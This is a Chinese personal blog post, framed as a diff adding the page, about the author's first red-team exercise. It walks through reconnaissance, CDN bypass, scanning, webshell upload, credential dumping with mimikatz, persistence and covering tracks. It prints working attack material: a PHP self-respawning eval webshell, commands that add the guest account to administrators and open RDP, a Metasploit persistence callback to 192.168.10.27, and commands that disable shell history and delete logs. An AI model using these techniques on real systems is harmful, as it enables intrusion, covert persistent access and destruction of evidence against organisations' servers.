@@ -1,0 +1,400 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>记一次渗透测试 | h0ld1rs的随手记</title><meta name="author" content="h0ld1rs"><meta name="copyright" content="h0ld1rs"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="第一次接触渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次渗透测试">
+<meta property="og:url" content="https://h0ld1rs.github.io/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:site_name" content="h0ld1rs的随手记">
+<meta property="og:description" content="第一次接触渗透测试">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://h0ld1rs.github.io/img/image/4.png">
+<meta property="article:published_time" content="2020-11-20T03:38:21.000Z">
+<meta property="article:modified_time" content="2021-07-31T13:32:19.174Z">
+<meta property="article:author" content="h0ld1rs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://h0ld1rs.github.io/img/image/4.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://h0ld1rs.github.io/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: true
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-07-31 21:32:19'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">96</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/image/4.png)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">h0ld1rs的随手记</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">记一次渗透测试</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-20T03:38:21.000Z" title="发表于 2020-11-20 11:38:21">2020-11-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-31T13:32:19.174Z" title="更新于 2021-07-31 21:32:19">2021-07-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>[TOC]</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次HW，了解到了真实的渗透测试流程，深刻了解到了除了ctf，<strong>一名合格的web狗更要学会渗透测试</strong></p>
+<p>因为是第一次，所以学到了大部分的工具，在这里整理一下，渗透测试遇到的一些基本知识点,以及一次打到一半的复现</p>
+<h1 id="实战开始"><a href="#实战开始" class="headerlink" title="实战开始"></a>实战开始</h1><h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>此次任务，渣渣我第一次接触红队，才知道他们只提供一个名单，也叫<strong>靶标</strong>，比如</p>
+<table>
+<thead>
+<tr>
+<th>xxx公司</th>
+<th>xxx企业</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>xxx机构</td>
+<td>xxx单位</td>
+</tr>
+</tbody></table>
+<p>没错，就这么水。。。只提供一个名字，然后让我们去找相关目标的信息，开始网上搜集信息，找到他们的网站，看一看有没用什么缺口，漏洞，然后控制后台，占领服务器等等，都会获得加分。</p>
+<p>好，废话不多说，开始</p>
+<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p><em>流程一共很多步骤，其实kali，就基本全部列出了</em></p>
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731161349.png"></p>
+<p>但是主办方的电脑不让用虚拟机，于是基本下都是在windows上操作的。</p>
+<p><code>其中最莫过于重要的可能是信息搜集，好歹知道打谁，才有机会打.</code></p>
+<h3 id="1-信息搜集"><a href="#1-信息搜集" class="headerlink" title="1.信息搜集"></a>1.信息搜集</h3><ul>
+<li><p>通过百度(感觉百度是最废的)，谷歌，fofa，钟馗之眼，潮汐指纹等搜索对应的公司名称，得到一个主站以及对应的IP</p>
+<p><strong>这都是网页版本的查询，具体查询都有对应的语法</strong></p>
+<p>如: <code>intitle:</code> <code>intext:</code> <code>site=</code> <code>ip=</code>搜索敏感词汇</p>
+<p><em>确定了大体目标以后，我们要保证他是真实 IP,大部分都会存在CDN，CDN是为了缓解服务器压力而出现的，他会阻碍我们的基础进程，所以要绕过(CDN大家可以自行百度)</em></p>
+</li>
+<li><p>通过nslookup 或者 站长之家的超级ping 来确定是否有CDN </p>
+<p><a target="_blank" rel="noopener" href="http://ping.chinaz.com/">超级ping</a></p>
+<p>nslookup 则是cmd下的一个命令</p>
+<p><em>如果查询出的ip数量大于一个的话，则说明该ip地址不是真实的服务器地址。也就是有CDN</em></p>
+</li>
+<li><p>如果判断出有CDN，则需要绕过CDN，然后用相应的工具绕过CDN，确保自己打的是真实的ip</p>
+<ol>
+<li><p>因为CDN不是很便宜，所以一般只给流量大的站点做CDN，很多小站子站点，又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP</p>
+<p>于是我们需要<strong>子域名挖掘机</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/2018111416434634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
+</li>
+<li><p>可以通过网站查找CDN<a target="_blank" rel="noopener" href="https://dnsdb.io/zh-cn/">CDN查询</a>，不停的绕，不停的判断，直到ping不出多个IP为止</p>
+</li>
+<li><p>通过国外<a target="_blank" rel="noopener" href="https://asm.saas.broadcom.com/en/ping.php">网站</a>进行访问ping，因为CDN一般只对国内用户进行加速</p>
+</li>
+</ol>
+</li>
+<li><p>然后用搜集相应的IP相关的信息,站长之家的whois，以及<a target="_blank" rel="noopener" href="https://www.tooleyes.com/list/wangluo/">工具网站</a>,进可能的对目标IP，获取更多的信息</p>
+</li>
+<li><p>还可以在贴吧，论坛等等地方，查询与该公司有关的任何信息。比如，公司的邮箱格式，公司的员工姓名，以及与该公司有关的任何信息。(指不定哪就进入公司的企业邮箱去了)</p>
+</li>
+<li><p>用工具判断服务所使用的web容器，所使用的CMS，这样可以方便查找相关漏洞</p>
+<p>可以使用网站指纹识别工具:<a target="_blank" rel="noopener" href="http://www.yunsee.cn/finger.html">云悉指纹识别</a> <a target="_blank" rel="noopener" href="http://whatweb.bugscaner.com/look/">在线cms识别</a></p>
+</li>
+<li><p><img src="https://img-blog.csdnimg.cn/20200215202059822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
+</li>
+</ul>
+<ol>
+<li>服务器类型: ping 一下，如果TTL值是两位 如<strong>64</strong>，就是linux系统，而三位数,如<strong>128</strong>,z则是windows系统</li>
+<li>nmap 进行扫描 nmap -A ,可以扫描出网站服务器对应的版本</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731161421.png"></p>
+<ol start="3">
+<li><p>根据插件 <strong>wapplayzer</strong> 判断 脚本类型(此步决定了以什么脚本编写木马并上传)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731161436.png"></p>
+<ol start="4">
+<li><ul>
+<li><p>ASP 和 ASPX：ACCESS、SQL Server</p>
+</li>
+<li><p>PHP：MySQL、PostgreSQL</p>
+</li>
+<li><p>JSP：Oracle、MySQL</p>
+<p>一般都为这几种</p>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+<ul>
+<li><p>GOBY工具扫描开放的端口，如 135 、137 、138 、139 、445，这几个端口经常爆发漏洞</p>
+</li>
+<li><p>然后 扫描网站敏感目录和文件</p>
+<ol>
+<li>后台目录：弱口令，万能密码，爆破</li>
+<li>安装包：获取数据库信息，甚至是网站源码</li>
+<li>上传目录：截断、上传图片马等</li>
+<li>mysql管理接口：弱口令、爆破，万能密码，然后脱裤，甚至是拿到shell</li>
+<li>安装页面 ：可以二次安装进而绕过</li>
+<li>phpinfo：会把你配置的各种信息暴露出来</li>
+</ol>
+</li>
+<li><p>最后的最后，就是C段，<strong>有些网站可能不是那么容易入侵。那么，可以查看该网站所在的服务器上是否还有其他网站。如果有其他网站的话，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后就自然可以拿下该网站了！</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.webscan.cc/">c段扫描</a></p>
+<p>还有网上给的一些扫描工具</p>
+<p>至此，信息搜集完毕</p>
+</li>
+</ul>
+<h3 id="2-漏洞探测"><a href="#2-漏洞探测" class="headerlink" title="2.漏洞探测"></a>2.漏洞探测</h3><ul>
+<li>SQL注入  (基本能过滤的都过滤了，反正我是没见到过)</li>
+<li>XSS跨站脚本 </li>
+<li>CSRF跨站请求伪造 </li>
+<li>XXE漏洞</li>
+<li>SSRF服务端请求伪造漏洞</li>
+<li>文件包含漏洞</li>
+<li>文件上传漏洞 </li>
+<li>文件解析漏洞</li>
+<li>远程代码执行漏洞 </li>
+<li>CORS跨域资源共享漏洞</li>
+<li>越权访问漏洞</li>
+<li>目录浏览漏洞和任意文件读取/下载漏洞，</li>
+<li>struts2漏洞，</li>
+<li>JAVA反序列化漏洞</li>
+</ul>
+<p>这些漏洞需要日常积累，当然，如果工具扫描出来了，一般都是CVE编号的漏洞，可以配合msf进行攻击，尝试控制该计算机，普通的burp等等工具自然也是一把好手</p>
+<p>小白，我见到的只有文件上传漏洞(哥斯拉了解一下)</p>
+<h3 id="3-内网转发"><a href="#3-内网转发" class="headerlink" title="3.内网转发"></a>3.内网转发</h3><p>对于我们得到漏洞，我们通过上传大马，来控制此计算机，此时，我们需要打进内网，才能进一步扩大我们的权限</p>
+<p>域渗透，一步步扩大自己的权限</p>
+<p>内网转发先鸽一下，大家参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/84568266">内网渗透</a></p>
+<h3 id="4-内网横向渗透"><a href="#4-内网横向渗透" class="headerlink" title="4. 内网横向渗透"></a>4. 内网横向渗透</h3><p>简单来说，就是从一台计算机，跳到另一台计算机上</p>
+<p>(烂土豆提权了解一下)</p>
+<blockquote>
+<p>对于windows主机，我们应该多去翻翻目录，或许能有很多意想不到的结果。很多人习惯把账号密码等容易忘的东西存放在备忘录中，或者是桌面上。我们还可以查找数据库的连接文件，查看数据库的连接账号密码等敏感信息。当我们获得了windows主机的账号密码，或者是自己创建了新用户后，我们为了不被网站管理员发现和不破坏服务器。我们尽量不要使用远程桌面。因为使用远程桌面动静比较大，如果此时服务器管理员也在登录，而你此时通过远程桌面登录的话，会将管理员挤掉，而你也将很快的被管理员踢掉。对于实在是要远程桌面登录的情况的话，我们尽量不要新建一个用户进行登录。我们可以激活 guest 用户，然后将其加入 administrators 组里面，用 guest 用户身份登录。在RDP远程登录后，我们可以查看其他用户桌面上和其他目录有哪些软件，我们要找的目标有以下。</p>
+</blockquote>
+<ul>
+<li>FTP相关的软件</li>
+<li>数据库相关的软件</li>
+<li>打开浏览器，查看历史记录，查看某些网站是否保存有用户密码。利用工具查看浏览器保存的密码</li>
+</ul>
+<p>从该主机上找到的账号密码，我们可以做一个字典，在对内网其他机器进行爆破的时候，很有可能是同密码。</p>
+<figure class="highlight shell"><figcaption><span>#激活guest用户</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net localgroup  administrators  guest  /add       #将guest用户添加到</span><br><span class="line">net user guest    密码                            #更改guest用户密码</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f                          #开启3389端口</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-权限维持"><a href="#5-权限维持" class="headerlink" title="5.权限维持"></a>5.权限维持</h3><p>在拿到目标主机的权限后，很有可能当时我们并不能获取到想要的东西，需要进行长期的潜伏，特别是在内网渗透中，需要进行长期的信息收集。这时，权限维持就很重要了。我们需要维持住获得的现有权限。</p>
+<ol>
+<li><p><strong>Web后门</strong></p>
+<ul>
+<li>隐藏后门文件(将文件设置为隐藏)</li>
+<li>404页面隐藏后门，或者在其他自带文件中插入后门代码(日志文件包含了解一下)</li>
+<li>不死马，该脚本每5秒向服务器创建test.php，并写入一句话免杀木马。结合attrib命令隐藏文件更好地建立后门。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);<span class="comment">//程序执行时间</span></span><br><span class="line">    ignore_user_abort(<span class="number">1</span>);<span class="comment">//关掉终端后脚本仍然运行</span></span><br><span class="line">    unlink(<span class="keyword">__FILE__</span>);<span class="comment">//文件完整名</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        file_put_contents(<span class="string">&#x27;test.php&#x27;</span>,<span class="string">&#x27;&lt;?php $a=array($_REQUEST[&quot;x&quot;]=&gt;&quot;3&quot;);</span></span><br><span class="line"><span class="string">        $b=array_keys($a)[0];</span></span><br><span class="line"><span class="string">        eval($b);?&gt;&#x27;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><em>注：以上几种后门方法均能被D盾等工具检测到</em></p>
+</li>
+<li><p><strong>linux系统</strong></p>
+<p>1：SSH后门</p>
+<p>2：crontab定时任务</p>
+<p>3：SSH公钥</p>
+<p>4：创建SUID=0的用户</p>
+</li>
+</ol>
+<ol start="3">
+<li>windows 系统</li>
+</ol>
+<p>1: 建立隐藏用户，在用户名后加 $ </p>
+<p>2：在开机启动目录下放置木马文件，只要目标机器重启，将回连我们的远控</p>
+<p>3：MSF里的 persistence 模块，执行命令可以使目标机器每隔一定时间自动回连远控。但是容易被发现</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀</span></span><br><span class="line"></span><br><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.10.27  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">然后它就在目标机新建了这个文件：C:\Windows\TEMP\CJzhFlNOWa.vbs ，并把该服务加入了注册表中，只要开机就会启动</span></span><br></pre></td></tr></table></figure>
+
+<p>4：在域环境下，想办法获得 krbtgt 用户的哈希，该用户的哈希可以进行票据传递攻击。而且一般该用户的密码不经常改变。</p>
+<p>5：shift后门(粘滞键替换)</p>
+<p>6：远程桌面会话劫持</p>
+<h3 id="6-痕迹清理"><a href="#6-痕迹清理" class="headerlink" title="6. 痕迹清理"></a>6. 痕迹清理</h3><p>我们只能清除我们留下的一部分痕迹，并不能完全清除，完全清除入侵痕迹是不可能的 。</p>
+<p>(就像没有完美犯罪一样)</p>
+<ul>
+<li><p><strong>linux系统</strong></p>
+<p>1.如果是Linux系统，在获取权限后，执行以下命令，不会记录输入过的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export HISTFILE&#x3D;&#x2F;dev&#x2F;null export HISTSIZE&#x3D;0</span><br></pre></td></tr></table></figure>
+
+<p>2.删除 /var/log 目录下的日志文件</p>
+<p>3.如果是web应用，找到web日志文件，删除</p>
+</li>
+<li><p>windows系统</p>
+<p>1：如果是windows系统，可用MSF中的 clearev 命令清除痕迹</p>
+<p>2：如果3389远程登录过，需要清除mstsc痕迹</p>
+<p>3：执行命令清除日志</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del %WINDR%\* .log /a/s/q/f</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<p>ok，一套流程完成，(如果顺利的话)，接下来就是攥写报告</p>
+<h1 id="实战复现"><a href="#实战复现" class="headerlink" title="实战复现"></a>实战复现</h1><p>其实我挖到两个洞，一个是弱密码后台的登录</p>
+<p>admin</p>
+<p>123456</p>
+<p>(希望这种弱智密码能多一点)</p>
+<p>一个就是基本的流程,接下来说一下这个基本的流程</p>
+<h2 id="扫描后台"><a href="#扫描后台" class="headerlink" title="扫描后台"></a>扫描后台</h2><p>扫描到一个ip，有logs目录，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731161456.png"></p>
+<p>一个一个点进去看，发现有用的东西</p>
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731161514.png"></p>
+<h2 id="猜想"><a href="#猜想" class="headerlink" title="猜想"></a>猜想</h2><p>OK,用户名，这么多用户名，盲猜，肯定有人把密码设置为 123456,于是可以用python写一个脚本,读取username=用户名后面的名称，password=123456，把构造的参数，以post形式返回给登录界面的url，如果状态码是200，就可以登录成功，输出用户名</p>
+<p>(脚本想看的话，以后上传)</p>
+<h2 id="成功登录"><a href="#成功登录" class="headerlink" title="成功登录"></a>成功登录</h2><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731161529.jpg"></p>
+<p>接下来就是找到了一个上传点，然后用哥斯拉，生成且上传了一个大马 (IIS框架，所以用C#语言编写，直接利用他的环境)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731161550.png"></p>
+<p>木马上传后，我得到了他的控制权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731161603.png"></p>
+<h2 id="提权与维权"><a href="#提权与维权" class="headerlink" title="提权与维权"></a>提权与维权</h2><p>接下来就是按照上面的做法，进行提权与维权(下载了CS神器)，</p>
+<p>之后利用 <strong>procdump64+mimikatz</strong>可实现从内存中获取明文密码</p>
+<p>我就只能进行到这里了，域渗透和横向渗透。。。原谅我不会</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">h0ld1rs</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://h0ld1rs.github.io/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">https://h0ld1rs.github.io/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://h0ld1rs.github.io" target="_blank">h0ld1rs的随手记</a>！</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="/img/image/4.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2020/11/20/PHP/PHP%E5%BA%8F%E5%88%97%E5%8C%96/"><img class="prev-cover" src="/img/%E5%9B%BE%E5%BA%93/1.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PHP序列化</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">h0ld1rs</div><div class="author-info__description">博主笨的离谱，希望各位佬们多包含</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">96</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/h0ld1rs"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/h0ld1rs/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:yumeibumei@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E5%BC%80%E5%A7%8B"><span class="toc-number">2.</span> <span class="toc-text">实战开始</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1"><span class="toc-number">2.1.</span> <span class="toc-text">任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span 